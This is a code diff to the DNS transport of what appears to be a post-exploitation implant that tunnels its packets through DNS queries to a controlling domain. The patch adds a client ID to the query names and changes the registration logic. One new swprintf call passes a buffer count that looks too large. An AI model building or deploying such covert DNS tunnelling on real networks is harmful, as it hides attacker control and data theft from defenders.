@@ -516,7 +516,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
     PUSHORT counter = &ctx->counter;
     PIP4_ARRAY pSrvList = (PIP4_ARRAY)ctx->pip4;
     wchar_t *domain = ctx->domain;
-
+    wchar_t *client_id = ctx->client_id;
     wchar_t *request = NULL;
 
     DWORD totalLength = packet->payloadLength + sizeof(PacketHeader);
@@ -569,6 +569,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
         wcscat_s(request, MAX_DNS_NAME_SIZE, L".tx.");
         wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
         wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
+        wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
+        wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
         wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
         force_stop = FALSE;
         vdprintf("[PACKET TRANCIEVE WINDNS] HEADER request: %S", request);
@@ -606,7 +608,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
             force_stop = FALSE;
 
             request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
-            rest_len = MAX_DNS_NAME_SIZE - ((DWORD)wcslen(domain)) - 6 - ((DWORD)wcslen(sub_c)) - ((DWORD)wcslen(idx_c));
+            rest_len = MAX_DNS_NAME_SIZE - ((DWORD)wcslen(domain)) - 7 - ((DWORD)wcslen(sub_c)) - ((DWORD)wcslen(idx_c)) - ((DWORD)wcslen(client_id));
             rest_len = min(rest_len, need_to_send - current_sent);
             parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
             parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
@@ -637,6 +639,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
             wcscat_s(request, MAX_DNS_NAME_SIZE, idx_c);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
             wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
+            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
+            wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
             wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L"\x00");
@@ -860,11 +864,14 @@ static DWORD register_dns(DnsTransportContext* ctx)
             } while (result_iter->pNext != NULL);
 
             vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%x'", xxx[0]->block.data[0]);
+            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%c'", xxx[0]->block.data[0]);
             vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID1: '%x'", xxx[0]->block.data[1]);
 
             if (xxx[0] != NULL && xxx[0]->block.data[1] == 0){
                 vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID: '%x'", xxx[0]->block.data[0]);
-                memcpy(ctx->client_id + 1, xxx[0]->block.data, 1);
+                if(ctx->client_id) SAFE_FREE(ctx->client_id);
+                ctx->client_id= (wchar_t*)calloc(2,sizeof(wchar_t));
+                swprintf(ctx->client_id, 2*sizeof(wchar_t), L"%c", xxx[0]->block.data[0]);
                 ctx->ready = TRUE;
                 break;
             }
@@ -1006,8 +1013,8 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
         if (rcvStatus == TRUE) // Handle response
         {
             vdprintf("[PACKET RECEIVE DNS] Registred. New CLIENT ID: '%s'", ctx->client_id);
-            SetLastError(ERROR_SUCCESS);
-            res = ERROR_SUCCESS;
+            SetLastError(DNS_INFO_NO_RECORDS);
+            res = DNS_INFO_NO_RECORDS;
         } else {
             vdprintf("[PACKET RECEIVE DNS] Registration failed!");
             SetLastError(DNS_INFO_NO_RECORDS);
@@ -1061,8 +1068,13 @@ static BOOL server_init_windns(Transport* transport)
     //ctx->hints.ai_family = AF_INET6;
     //ctx->hints.ai_socktype = SOCK_STREAM;
     
-    //ctx->ready = TRUE;
-    dprintf("[WINDNS] DNS Ready for reg");
+    if (ctx->client_id == NULL || ctx->client_id[0] == L'\0' || ctx->client_id[0] == L'0'){
+        dprintf("[WINDNS] DNS Ready for reg");
+        ctx->ready = FALSE;
+    } else {
+        dprintf("[WINDNS] DNS already registred with CLIENT_ID %S", ctx->client_id);
+        ctx->ready = TRUE;         
+    }
 
     return TRUE;
 }
